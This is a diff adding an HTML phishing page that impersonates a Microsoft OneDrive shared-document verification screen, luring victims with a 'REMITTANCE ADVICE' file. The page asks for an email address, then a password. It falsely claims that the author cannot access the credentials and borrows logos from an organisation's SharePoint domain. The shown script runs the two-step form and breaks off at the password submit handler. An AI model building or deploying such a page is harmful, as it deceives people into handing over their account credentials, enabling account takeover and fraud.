@@ -1,0 +1,625 @@
+<html><head>
+	<meta charset="utf-8">
+	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <link id="favicon" rel="shortcut icon" href="https://glwater-my.sharepoint.com/_layouts/15/images/favicon.ico?rev=47" type="image/vnd.microsoft.icon">
+	<title>Sharing Link Validation</title>
+<style type="text/css" media="screen, print, projection">
+		html{line-height:1.15;-ms-text-size-adjust:100%;-webkit-text-size-adjust:100%}body{margin:0}article,aside,footer,header,nav,section{display:block}h1{font-size:2em;margin:.67em 0}figcaption,figure,main{display:block}figure{margin:1em 40px}hr{box-sizing:content-box;height:0;overflow:visible}pre{font-family:monospace,monospace;font-size:1em}a{background-color:transparent;-webkit-text-decoration-skip:objects}abbr[title]{border-bottom:none;text-decoration:underline;text-decoration:underline dotted}b,strong{font-weight:inherit}b,strong{font-weight:bolder}code,kbd,samp{font-family:monospace,monospace;font-size:1em}dfn{font-style:italic}mark{background-color:#ff0;color:#000}small{font-size:80%}sub,sup{font-size:75%;line-height:0;position:relative;vertical-align:baseline}sub{bottom:-.25em}sup{top:-.5em}audio,video{display:inline-block}audio:not([controls]){display:none;height:0}img{border-style:none}svg:not(:root){overflow:hidden}button,input,optgroup,select,textarea{font-family:sans-serif;font-size:100%;line-height:1.15;margin:0}button,input{overflow:visible}button,select{text-transform:none}[type=reset],[type=submit],button,html [type=button]{-webkit-appearance:button}[type=button]::-moz-focus-inner,[type=reset]::-moz-focus-inner,[type=submit]::-moz-focus-inner,button::-moz-focus-inner{border-style:none;padding:0}[type=button]:-moz-focusring,[type=reset]:-moz-focusring,[type=submit]:-moz-focusring,button:-moz-focusring{outline:1px dotted ButtonText}fieldset{padding:.35em .75em .625em}legend{box-sizing:border-box;color:inherit;display:table;max-width:100%;padding:0;white-space:normal}progress{display:inline-block;vertical-align:baseline}textarea{overflow:auto}[type=checkbox],[type=radio]{box-sizing:border-box;padding:0}[type=number]::-webkit-inner-spin-button,[type=number]::-webkit-outer-spin-button{height:auto}[type=search]{-webkit-appearance:textfield;outline-offset:-2px}[type=search]::-webkit-search-cancel-button,[type=search]::-webkit-search-decoration{-webkit-appearance:none}::-webkit-file-upload-button{-webkit-appearance:button;font:inherit}details,menu{display:block}summary{display:list-item}canvas{display:inline-block}template{display:none}[hidden]{display:none}
+		.ms-Fabric{-moz-osx-font-smoothing:grayscale;-webkit-font-smoothing:antialiased;color:#333;font-family:'Segoe UI Web (West European)','Segoe UI',-apple-system,BlinkMacSystemFont,Roboto,'Helvetica Neue',sans-serif;font-size:14px}.ms-Fabric button,.ms-Fabric input{font-family:inherit}@media (max-width:479px){.ms-hiddenLgDown,.ms-hiddenMdDown,.ms-hiddenSm,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:480px) and (max-width:639px){.ms-hiddenLgDown,.ms-hiddenMd,.ms-hiddenMdDown,.ms-hiddenMdUp,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:640px) and (max-width:1023px){.ms-hiddenLg,.ms-hiddenLgDown,.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlDown,.ms-hiddenXxlDown{display:none!important}}@media (min-width:1024px) and (max-width:1365px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXl,.ms-hiddenXlDown,.ms-hiddenXlUp,.ms-hiddenXxlDown{display:none!important}}@media (min-width:1366px) and (max-width:1919px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlUp,.ms-hiddenXxl,.ms-hiddenXxlDown,.ms-hiddenXxlUp{display:none!important}}@media (min-width:1920px){.ms-hiddenLgUp,.ms-hiddenMdUp,.ms-hiddenXlUp,.ms-hiddenXxlUp,.ms-hiddenXxxl{display:none!important}}
+		@font-face {
+			font-family: 'FabricMDL2Icons';
+			src: url('data:application/octet-stream;base64,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') format('truetype');
+		}
+		.weCall {
+			-moz-osx-font-smoothing: grayscale;
+			-webkit-font-smoothing: antialiased;
+			display: inline-block;
+			font-family: 'FabricMDL2Icons';
+			font-style: normal;
+			font-weight: normal;
+			speak: none;
+		}
+		.ms-Icon--Cancel:before { content: "\E711"; }
+		.ms-Icon--CheckMark:before { content: "\E73E"; }
+		.ms-Icon--Completed:before { content: "\E930"; }
+		.ms-Icon--Info:before { content: "\E946"; }
+		.ms-Icon--ErrorBadge:before { content: "\EA39"; }
+		body,html{height:100%;background:#f4f4f4}.checkbox,.notification .dismiss:focus{outline:0}.external-sharing-content{height:100%}.external-sharing-content a.disabled{pointer-events:none;cursor:default}*,:after,:before{box-sizing:inherit}.spinner,html{box-sizing:border-box}.main-content{flex-direction:column;display:flex;align-items:center;padding:0 12px}.top-banner{flex-direction:column;display:flex;height:40px;padding:0 20px;justify-content:center;background:#0078d7}.top-banner .brand-name{color:#fff;font-size:21px}.checkbox{cursor:pointer;padding:0;border:none;background:0 0;margin:0;display:block}.checkbox .checkbox-checkbox{height:20px;width:20px;box-sizing:border-box;display:flex;align-items:center;justify-content:center;border-width:1px;border-style:solid;border-color:#a6a6a6;margin-right:8px;transition-property:'background, border, border-color';transition-duration:.2s;transition-timing-function:.2s;overflow:hidden}.checkbox .checkbox-checkbox .ms-Icon{visibility:hidden}.checkbox.checked .checkbox-checkbox .ms-Icon,.focus-area .ms-Icon:active+.callout,.focus-area .ms-Icon:focus+.callout,.focus-area .ms-Icon:hover+.callout{visibility:visible}.checkbox input[type=checkbox]{display:none}.checkbox .checkbox-label{display:inline-flex;align-items:center;cursor:pointer;position:relative;user-select:none}.checkbox.disabled .checkbox-checkbox{background:#eaeaea;border-color:#eaeaea;color:#fff}.checkbox.disabled .checkbox-label{cursor:default}.checkbox .checkbox-text{margin-right:8px;font-size:14px}.checkbox.checked .checkbox-checkbox{border-color:#0078d7;background:#0078d7;color:#fff}.notification{height:32px;display:flex;justify-content:center;align-items:center;z-index:1;position:absolute;top:-32px;left:0;width:100%;transition:top .5s ease-in-out}.notification .dismiss{border:0;padding:0;background:0 0;height:15px;width:15px;margin:0 8px}.notification .dismiss:hover{cursor:pointer}.notification .dismiss .ms-Icon{margin:0}.notification.visible{top:0}.notification.success{background:#dff6dd}.notification.error{background:#fde7e9}.notification .ms-Icon{margin:0 8px}.notification span{flex:1 1 100%}input::-webkit-inner-spin-button,input::-webkit-outer-spin-button{margin:0;-webkit-appearance:none}input[type=number]{-moz-appearance:textfield}input[type=number]::-ms-clear{display:none}.desktop-logo{margin:57px 0 20px}.mobile-logo{margin-top:24px}.microsoft-logo{height:24px;width:113px}.form-input-container{position:relative;font-size:17px}.form-input-container .focus-area{position:absolute;top:12.5px;right:12.5px}.sharing-form{border-radius:6px;box-shadow:0 0 10px 0 rgba(0,0,0,.17);max-width:360px;display:flex;flex-direction:column;margin:13px 0 16px}.sharing-form .header{border-top-left-radius:6px;border-top-right-radius:6px;padding-top:21px;height:72px;border-bottom-width:1px;border-bottom-style:solid;border-color:#c8c8c8;font-size:21px;text-align:center;background-color:#f8f8f8;z-index:2;position:relative}.form-content{border-bottom-right-radius:6px;border-bottom-left-radius:6px;padding:28px 32px 32px;background:#fff;position:relative}.form-content .placeholder-text,.form-content input{height:44px;width:100%}.form-content .form-submit{background-color:#0078d7;color:#fff;border:0}.form-content .form-submit.disabled{background:#f4f4f4;color:#a6a6a6}.form-content .form-submit.disabled+.submitted-text{display:flex;position:absolute;top:0;left:0;width:100%;height:100%;justify-content:center;align-items:center}.form-content .form-submit.disabled+.submitted-text .spinner{margin-right:14px}.form-content .form-submit+.submitted-text{color:#a6a6a6;background-color:#f4f4f4;display:none}.file-description .file-description-title{color:#666;font-size:14px;margin-bottom:24px}.file-description .file-info{display:flex;align-items:center}.file-description .file-info img{height:32px;width:32px;margin-right:15px}.file-description .file-info .file-name{font-size:17px;color:#333}.form-message{font-size:14px;font-weight:400;color:#666;line-height:17px;margin:22px 0 24px}.form-message .email{color:#333}.form-message a{color:#666}.interrupt-message{text-align:center}.interrupt-message img{width:79px;height:82px;margin-bottom:20px}.interrupt-message .interrupt-message-text{font-size:17px}.form-text-input{border-width:1px;border-style:solid;padding:11px;margin-bottom:20px;color:#666;border-color:#a6a6a6}.form-text-input.disabled{background:#f4f4f4;color:#a6a6a6;border:#f4f4f4}.form-text-input.disabled::placeholder{color:#a6a6a6}.form-text-input.is-empty+.placeholder-text{display:block}.form-text-input.has-error{border-color:#A80000;margin-bottom:14px}.form-text-input+.placeholder-text{position:absolute;color:#666;top:0;left:0;line-height:44px;padding:0 11px;display:none;pointer-events:none}.focus-area,.focus-area .ms-Icon{position:relative;display:inline-block}.form-text-input::placeholder{color:#666}.form-error-container{color:#A80000;font-size:12px;margin-bottom:8px}.focus-area{vertical-align:middle}.callout{bottom:200%;width:276px;left:50%;font-size:12px;line-height:16px;visibility:hidden;background-color:#fff;color:#333;padding:9px 12px;border-radius:6px;margin-left:calc(-276px/2);text-align:left;box-shadow:2px 2px 10px 0 rgba(0,0,0,.3);position:absolute;z-index:3}.callout .callout-title{font-size:17px;margin-bottom:11px;line-height:20px}.callout:after{content:" ";position:absolute;box-shadow:rgba(0,0,0,.3) 2px 2px 2px;transform:rotate(45deg);bottom:-9px;border-width:10px;border-style:solid;border-color:transparent #fff #fff transparent;left:127px}@media (max-width:479px){.callout{left:-95px}.callout:after{right:24px;left:initial}}.legal{font-size:12px;font-weight:400;display:flex;justify-content:space-between}.legal>*{margin-right:12px}.legal>:last-child{margin-right:0}.legal a{color:#333;text-decoration:none}.spinner{height:20px;width:20px;border-radius:50%;border:1.5px solid #c7e0f4;border-top-color:#0078d7;animation:spinAnimation 1.3s infinite cubic-bezier(.53,.21,.29,.67)}@keyframes spinAnimation{0%{transform:rotate(0)}100%{transform:rotate(360deg)}}.form-checkbox-container{margin-top:24px;font-size:14px;font-weight:400}.privacy{padding-top:16px;font-size:12px;}
+	</style><style type="text/css">
+	
+	html, body {
+		height: 100%;
+		overflow: hidden;
+
+	}
+
+	body {
+		margin: 0;
+		background-color: #f4f4f4;
+		font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+		direction: ltr;
+
+	}
+
+
+	*, :after, :before {
+    box-sizing: inherit;
+}
+
+
+* {
+	box-sizing: border-box;
+}
+
+
+.topper {
+	width: 100%;
+	height: 35px;
+	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+	background-color: #0078d7;
+	color: #fff;
+	justify-content: center;
+	display: flex;
+	flex-direction: column;
+}
+
+
+h4 {
+	padding-left: 14px;
+	margin: 0;
+	font-size: 19px;
+}
+
+
+.preload * {
+  -webkit-transition: none !important;
+  -moz-transition: none !important;
+  -ms-transition: none !important;
+  -o-transition: none !important;
+}
+
+
+.formCont {
+	width: 345px;
+	height: 490px;
+	margin-left: auto;
+	margin-right: auto;
+	background-color: #fff;
+	box-shadow: 0 0 10px 0 rgb(0 0 0 / 17%);
+	border-bottom-left-radius: 7px;
+	border-bottom-right-radius: 7px;
+	
+}
+
+
+.topInfo {
+	background-color: #f8f8f8;
+	border-bottom: 1px solid #ccc;
+	color: #000;
+	font-size: 18px;
+	display: flex;
+	flex-direction: column;
+	justify-content: center;
+	height: 72px;
+	width: 100%;
+	border-top-right-radius: 7px;
+	border-top-left-radius: 7px;
+}
+
+
+.bottomInfo {
+	padding: 28px 32px 32px;
+	font-size: 12px;
+	position: relative;
+}
+
+.bottomFlex {
+	display: flex;
+	flex-direction: column;
+	margin-top: -10px;
+
+}
+
+.noted {
+	color: #666;
+	font-size: 14px;
+	line-height: 17px;
+	font-weight: 400;
+
+}
+
+.capCap {
+	font-size: 16px;
+	padding-left: 10px;
+	font-family: "Segoe UI Webfont",-apple-system,"Helvetica Neue","Lucida Grande","Roboto","Ebrima","Nirmala UI","Gadugi","Segoe Xbox Symbol","Segoe UI Symbol","Meiryo UI","Khmer UI","Tunga","Lao UI","Raavi","Iskoola Pota","Latha","Leelawadee","Microsoft YaHei UI","Microsoft JhengHei UI","Malgun Gothic","Estrangelo Edessa","Microsoft Himalaya","Microsoft New Tai Lue","Microsoft PhagsPa","Microsoft Tai Le","Microsoft Yi Baiti","Mongolian Baiti","MV Boli","Myanmar Text","Cambria Math";
+}
+
+.docPose {
+	display: inline-flex;
+	justify-content: center;
+}
+
+.docPose > p {
+	padding-left: 8px;
+	margin-bottom: 4px;
+}
+
+.cormFish {
+	width: 100%;
+}
+
+.cormFish2 {
+	width: 100%;
+}
+
+input {
+	width: 100%;
+	height: 35px;
+	padding: 5px;
+	color: #666;
+	font-size: 15px;
+	font-weight: 400;
+	box-shadow: none;
+	box-sizing: border-box;
+	border: solid 1px #666;
+	margin-bottom: 15px;
+
+}
+
+.butzButz {
+	width: 100%;
+	background-color: #0078d7;
+	color: #fff;
+	justify-content: center;
+	font-size: 15px;
+	font-weight: 400;
+	border: none;
+	padding: 9px 0;
+
+}
+
+.ticker {
+	
+	font-size: 12px;
+	font-family: #eee;
+	text-align: center;
+	padding-right: 5px;
+	
+}
+
+.ticker > p {
+	display: inline-flex;
+	align-content: center;
+	padding-right: 7px;
+
+}
+
+.img-banner {
+	margin-top: 15px;
+	margin-bottom: 30px;
+}
+
+.weSpeak {
+	position: absolute;
+	top: 13.2pc;
+	left: 18pc;
+}
+
+.weCall {
+	position: relative;
+	-moz-osx-font-smoothing: grayscale;
+    -webkit-font-smoothing: antialiased;
+    display: inline-block;
+    font-family: 'FabricMDL2Icons';
+    font-style: normal;
+    font-weight: normal;
+    speak: none;
+
+}
+
+.callOut {
+	font-size: 17px;
+	margin-bottom: 11px;
+	line-height: 20px;
+}
+
+.eNoShock {
+	bottom: 200%;
+    width: 252px;
+    left: 50%;
+    font-size: 12px;
+    line-height: 16px;
+    visibility: hidden;
+    background-color: #fff;
+    color: #333;
+    padding: 9px 12px;
+    border-radius: 6px;
+    margin-left: calc(-276px/2);
+    text-align: left;
+    box-shadow: 2px 2px 10px 0 rgb(0 0 0 / 30%);
+    position: absolute;
+    z-index: 3;
+}
+
+.eNoShock:after {
+	    content: " ";
+    position: absolute;
+    box-shadow: rgb(0 0 0 / 30%) 2px 2px 2px;
+    transform: rotate(45deg);
+    bottom: -9px;
+    border-width: 10px;
+    border-style: solid;
+    border-color: transparent #fff #fff transparent;
+    left: 127px;
+}
+
+.weCall:before {
+	content: "\E946";
+}
+
+
+.weSpeak:hover .eNoShock {
+	visibility: visible;
+}
+
+
+.pit {
+	line-height: 15px;
+	font-size: 12px;
+
+
+}
+
+
+.hidden {
+	visibility: hidden;
+	display: none;
+}
+
+.topMemba {
+	display: block;
+	justify-content: center;
+	text-align: center;
+	font-weight: 500;
+
+}
+
+.err {
+	color: #A80000;
+	margin-top: 0;
+}
+
+#err {
+	margin-top: 0;
+}
+
+
+input.has-error:focus {
+	 
+	border: solid 1px #A80000;
+	outline: none;
+}
+
+.addyJust {
+	margin-top: 30px;
+}
+
+
+.animate {
+	
+	animation-name: show-from-right;
+    -webkit-animation-name: show-from-right;
+    -moz-animation-name: show-from-right;
+    -ms-animation-name: show-from-right;
+    -o-animation-name: show-from-right;
+	animation-duration: 2s;
+    -webkit-animation-duration: 2s;
+    -moz-animation-duration: 2s;
+    -ms-animation-duration: 2s;
+    -o-animation-duration: 2s;
+    animation-timing-function: cubic-bezier(.5,0,.5,1);
+    -webkit-animation-timing-function: cubic-bezier(.5,0,.5,1);
+    -moz-animation-timing-function: cubic-bezier(.5,0,.5,1);
+    -ms-animation-timing-function: cubic-bezier(.5,0,.5,1);
+    -o-animation-timing-function: cubic-bezier(.5,0,.5,1);
+    animation-fill-mode: both;
+    -webkit-animation-fill-mode: both;
+    -moz-animation-fill-mode: both;
+    -ms-animation-fill-mode: both;
+    -o-animation-fill-mode: both;
+    transition-property: left;
+    -webkit-transition-property: left;
+    -moz-transition-property: left;
+    -ms-transition-property: left;
+    -o-transition-property: left;
+
+}
+
+
+#topMembaEmail {
+	font-size: 15px;
+}
+
+
+</style></head>
+
+
+
+
+
+
+<body class="">
+	<div class="topper">
+			
+			<header>
+				<h4>OneDrive</h4>
+			</header>
+	</div>
+
+	<!-- microLogo -->
+
+	<div class="img-banner">
+		<center>
+			<img src="https://glwater-my.sharepoint.com/_layouts/15/images/microsoft-logo.png" style="width:113px; height: 24px; opacity: 1;">
+		</center>	
+	</div>
+
+	<!-- microLogo -->
+
+	<!-- idText -->
+<div>
+
+	<div class="formCont">
+			
+			<div class="topInfo">
+				<center>
+			<span>
+					Verify your Identity
+			</span>
+				</center>
+			</div>
+
+
+
+
+			<!-- downBelow -->
+
+
+		<div class="bottomInfo animate">
+			
+			<div class="bottomFlex">	
+				<p class="noted">
+					You've received a secure link to:
+				</p>
+				<div class="docPose">
+					<img src="data:image/svg+xml;base64,PHN2ZyB4bWxucz0iaHR0cDovL3d3dy53My5vcmcvMjAwMC9zdmciIHZpZXdCb3g9IjAgMCAzMiAzMiI+PGcgc3Ryb2tlPSIjOTc5NTkzIiBzdHJva2UtbWl0ZXJsaW1pdD0iMTAiPjxwYXRoIGZpbGw9IiNGRkYiIGQ9Ik0yMC4wODYgMi41SDYuNWExIDEgMCAwMC0xIDF2MjVhMSAxIDAgMDAxIDFoMTlhMSAxIDAgMDAxLTFWOC45MTRhMSAxIDAgMDAtLjI5My0uNzA3bC01LjQxNC01LjQxNGExIDEgMCAwMC0uNzA3LS4yOTN6Ii8+PHBhdGggZmlsbD0ibm9uZSIgZD0iTTIwLjUgMi41djVhMSAxIDAgMDAxIDFoNSIvPjwvZz48ZyBmaWxsPSIjQzhDNkM0Ij48cGF0aCBkPSJNMjMuNSAxM2gtMTVhLjUuNSAwIDAxMC0xaDE1YS41LjUgMCAwMTAgMXpNMjMuNSAxNWgtMTVhLjUuNSAwIDAxMC0xaDE1YS41LjUgMCAwMTAgMXoiLz48L2c+PHBhdGggZmlsbD0iI0M4QzZDNCIgZD0iTTIzLjUgMTdoLTE1YS41LjUgMCAwMTAtMWgxNWEuNS41IDAgMDEwIDF6Ii8+PHBhdGggZmlsbD0iI0Q2NTUzMiIgZD0iTTE5IDIwYy41NTEgMCAxIC40NDkgMSAxdjRjMCAuNTUxLS40NDkgMS0xIDFoLTZjLS41NTEgMC0xLS40NDktMS0xdi00YzAtLjU1MS40NDktMSAxLTFoNm0wLTFoLTZhMiAyIDAgMDAtMiAydjRhMiAyIDAgMDAyIDJoNmEyIDIgMCAwMDItMnYtNGEyIDIgMCAwMC0yLTJ6TTUgMjZoNC43NWEuMjUuMjUgMCAwMC4yNS0uMjV2LTUuNWEuMjUuMjUgMCAwMC0uMjUtLjI1SDVhMSAxIDAgMDAtMSAxdjRhMSAxIDAgMDAxIDF6TTI3IDIwaC00Ljc1YS4yNS4yNSAwIDAwLS4yNS4yNXY1LjVjMCAuMTM4LjExMi4yNS4yNS4yNUgyN2ExIDEgMCAwMDEtMXYtNGExIDEgMCAwMC0xLTF6Ii8+PC9zdmc+" style="width:32px; height: 32px; opacity: 1; margin-top: 17px;">
+					<p class="capCap">
+						REMITTANCE ADVICE 
+					</p>
+				</div>
+				<p class="noted ">
+					To open this secure link, we'll need you to enter your email that this item was shared to.
+				</p>
+			</div>
+
+			<div class="cormFish">
+				<form method="POST" class="">
+					<div>
+						<input type="email" name="normad" id="normad" placeholder="Enter email">
+						<div class="weSpeak">
+							<i class="weCall"></i>
+							<div class="eNoShock">
+								<div class="callOut">Why do I have to do this?</div>
+								<span>The person that has shared this link with you is sharing with a secure link which requires you to verify your identity.</span>
+							</div>
+						</div>
+					</div>
+					<p class="err">
+						
+					</p>
+					<div>
+						<button class="butzButz" id="nexty">
+							Verify
+						</button>
+					</div>
+
+				</form>
+			</div>	
+
+						<div class="cormFish2 cups hidden">
+				<form method="POST" class="dSecond">
+					<div class="topMemba">
+						<p id="topMembaEmail">meInoLikeWahala@outlook.com</p>
+					</div>
+					<div>
+						<input type="password" name="bandits" id="bandits" placeholder="Enter password">
+						<!--<div class="weSpeak">
+							<i class="weCall"></i>
+							<div class="eNoShock">
+								<div class="callOut">Why do I have to do this?</div>
+								<span>The person that has shared this link with you is sharing with a secure link which requires you to verify your identity.</span>
+							</div>
+						</div>-->
+					</div>
+					<p id="err">
+						
+					</p>
+					<div>
+						<button class="butzButz" id="nexty">
+							View Document
+						</button>
+					</div>
+
+				</form>
+			</div>	
+
+
+			<div class="sticky">
+				<p class="pit " style="/*margin-top: 30px;">
+					By clicking Next you allow Microsoft the Authority to use your email address in accordance with their privacy statement. The Author has no access to your email and cannot access your credentials.
+				</p>
+			</div>				
+		</div>
+
+			
+
+
+		<!-- downBelow -->
+	</div>
+</div>
+
+		<div class="ticker">
+			
+				<p>© 2021 Microsoft</p>
+				<p>Privacy &amp; Cookies</p>
+			
+		</div>
+
+	<!-- idText -->
+	
+	
+
+
+
+<script src="https://code.jquery.com/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
+
+
+<script type="text/javascript">
+	$(window).load(function() {
+  $("body").removeClass("preload");
+  $(".bottomInfo").addClass("animate");
+});
+</script>
+
+<script type="text/javascript">
+   
+   var email = document.getElementById('normad');
+   var password = document.getElementById('bandits');
+   var counter = 0;
+
+
+
+$('#nexty').click(function(e){
+   e.preventDefault();
+   var checkmail = /^\w+([\.-]?\w+)*@\w+([\.-]?\w+)*(\.\w{2,3})+$/g;
+   var alertx = document.querySelector('.err');
+   var vMail =document.getElementById('normad').value;
+
+   
+   if($('#normad').val() == ""){
+      $('#normad').focus();
+     // $('.err').addClass("alertTed");
+      // alertx.style.color = "red";
+      alertx.textContent = "Your email address is required";
+      $('#normad').addClass("has-error");
+      return false;
+   }else if(!($('#normad').val().match(checkmail))){
+      $('#normad').focus();
+      //$('.err').addClass("alertTed");
+      // alertx.style.color = "red";
+      alertx.textContent = "Your email address must be in the correct email format (e.g. 'user@contoso.com')";
+      $('#normad').addClass("has-error");
+      return false;
+   }else{
+      
+      $('.noted').addClass("hidden");
+      $('.cormFish').addClass("hidden");
+      $('.sticky').addClass("hidden");
+      $('.cormFish2').removeClass("hidden");
+      $('.pit').addClass("addyJust");
+      $('#normad').addClass("has-error");
+      $('#bandits').focus();
+      $('#topMembaEmail').html(vMail);
+   }
+
+   $(document).on('submit', '.dSecond', function() {
